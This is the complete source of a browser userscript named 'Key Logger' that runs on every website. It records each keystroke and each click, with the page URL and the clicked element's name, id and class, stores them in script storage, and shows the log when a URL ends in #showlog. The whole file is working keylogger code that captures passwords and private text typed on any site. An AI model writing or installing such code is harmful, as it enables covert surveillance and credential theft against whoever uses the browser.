// ==UserScript==
// @name           Key Logger
// @namespace      http://matthewfl.com
// @include        *
// ==/UserScript==

if(GM_getValue("welcome", true)) {
 GM_setValue("welcome", false);
 alert("To view the log go to a page with the hash #showlog and reload the page\nto clear #clearlog\nexample: http://www.something.com/#showlog & http://www.something.com/#clearlog");
}

if(location.hash.indexOf('showlog') != -1) {
		var out = "<a href='?#clearlog'>Clear log</a>";
		out += "<br>" + GM_getValue("log", "").replace(/\n/g, "<br>");
document.body.innerHTML = out;
}else {


if(location.hash.indexOf('clearlog') != -1) {
		GM_setValue("log", ""); 
		alert('log cleared');
}

var url = unsafeWindow.location.href;
var log = "";

function Logger (e) {
		var n = e.which;
		var l = String.fromCharCode(n); 
		
		var o = '';
		if(n == 8)
				o = '[backspace]';
		else if(n == 9)
				o = '[tab]';
		
		
		log += o!=''?o:l;
}


function Save () {
		var l = GM_getValue("log", "");
		var o = "";
		if(unsafeWindow == unsafeWindow.top)
						o = "\n> "+  url;
				else
						o =  url;
		if(log != '') {
				o += "\n===================START======================\n\n" +
				log +
				"\n\n===================END========================\n";
		}
		o += "\n";
		GM_setValue("log", o+l); 
}

function Click (e) {
		log += "\n[click " + e.target.nodeName;
		if(typeof e.target.getAttribute('name') == "string")
				log += " " + e.target.getAttribute('name');
		if(typeof e.target.getAttribute('id') == "string")
				log += " #" + e.target.getAttribute('id');
		if(typeof e.target.getAttribute('class') == "string")
				log += " ." + e.target.getAttribute('class');
		log += "]\n";
		
		
}

unsafeWindow.addEventListener("unload", Save, false);
unsafeWindow.addEventListener("keypress", Logger, false);
unsafeWindow.addEventListener("click", Click, false);

}
